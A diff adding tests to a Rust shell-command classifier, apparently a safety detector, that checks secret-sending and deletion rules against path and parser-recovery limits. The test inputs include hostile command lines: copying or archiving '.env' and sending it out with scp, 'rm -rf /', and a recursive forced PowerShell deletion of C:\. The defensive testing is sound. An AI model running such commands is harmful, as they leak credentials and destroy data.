@@ -692,6 +692,65 @@ fn the_most_bytes_a_copy_places_its_names_at_is_the_limit() {
     // The same name again and again lands at one path.
     let same = format!("cp -r {}{folder}", "a ".repeat(4_000));
     assert!(!stopped_by(&same, Shell::Posix, "too many paths"));
+    // Followed for a secret the line then sends (`copied_by` in
+    // `detect/send.rs`), each source lands at the folder and at its name
+    // there, and each member of an archive at the archive: past the same
+    // bytes the copy is not followed, and a send after it is unreadable,
+    // since what it sends may be any file the copy wrote. Here a source
+    // lands at 1,023 bytes and 1,028, so 127 are followed, and a member at
+    // the archive's 1,029, so 254 are.
+    let sends = |line: &str| {
+        classify(line, Shell::Posix, &paths_for(Shell::Posix))
+            .findings()
+            .iter()
+            .any(|finding| finding.rule == Rule::SendSecret)
+    };
+    for (program, to, expected) in [
+        ("cp", folder.clone(), 127),
+        ("rsync", folder.clone(), 127),
+        ("tar -cf", format!("{folder}/x.tar"), 254),
+    ] {
+        let line = |n: usize| {
+            let names: Vec<String> = (1..n).map(|at| format!("a{at:03}")).collect();
+            if program == "tar -cf" {
+                format!("{program} {to} .env {}; scp {to} h:", names.join(" "))
+            } else {
+                format!("{program} .env {} {to}; scp -r {to} h:", names.join(" "))
+            }
+        };
+        let found = edge(1_000, |n| sends(&line(n)));
+        assert_eq!(found, expected, "{program}");
+        assert!(stopped_by(&line(found + 1), Shell::Posix, "too many paths"));
+    }
+}
+
+#[test]
+fn a_script_after_the_recoveries_are_spent_is_not_parsed() {
+    // `MAX_RECOVERIES` in `unit.rs` is checked as a grammar reads, after it
+    // starts a recovery in full: a script the line runs once the count is
+    // spent is not parsed at all, so each later script with an error does
+    // not pay for one recovery. Nor is one without an error read: the line
+    // is unreadable, and what the later script does is not found.
+    let delete = |line: &str| {
+        classify(line, Shell::Posix, &paths_for(Shell::Posix))
+            .findings()
+            .iter()
+            .any(|finding| finding.rule == Rule::Delete)
+    };
+    for (noise, script) in [
+        ("echo a; ) ", "bash -c 'rm -rf /'"),
+        ("1 2 ", "pwsh -c 'Remove-Item -Recurse -Force C:\\'"),
+    ] {
+        let program = if script.starts_with("bash") {
+            "bash"
+        } else {
+            "pwsh"
+        };
+        let line = |n: usize| format!("{program} -c '{}'; {script}", noise.repeat(n));
+        assert!(delete(&line(200)), "{script}");
+        assert!(!delete(&line(300)), "{script}");
+        assert!(stopped_by(&line(300), Shell::Posix, "takes too long"));
+    }
 }
 
 #[test]
